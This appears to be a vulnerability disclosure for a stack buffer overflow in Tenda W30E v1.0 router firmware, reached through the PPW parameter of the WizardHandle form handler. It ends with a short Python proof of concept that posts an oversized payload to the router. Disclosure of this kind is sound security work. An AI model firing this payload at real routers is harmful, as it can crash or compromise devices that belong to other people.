## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2218.html

## Affected version

W30Ev1.0 V1.0.1.25(633)

## Vulnerability details

The Tenda W30Ev1.0 V1.0.1.25(633) firmware has a stack overflow vulnerability located in the `fromWizardHandle` function. This function accepts the `WANT`and `WANS` parameter from a POST request. Within `v46 == 2`, this function accepts the `PPW` parameter from a POST request, which is assigned to `sub_3AD5C(v30, v5);`. However, since the user has control over the input of `PPW`, the function `sub_3AD5C()` leads to a buffer overflow. The user-supplied `PPW` can exceed the capacity of the `v5` array, thus triggering this security vulnerability.

![image-20240409104408560](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104408560.png)

![image-20240409104429616](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104429616.png)

![image-20240409104441718](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104441718.png)

![image-20240409104454317](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409104454317.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WizardHandle"
payload = b"a"*1000

data = {"WANS":"0","WANT":"2","PPW": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102339559](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102339559.png)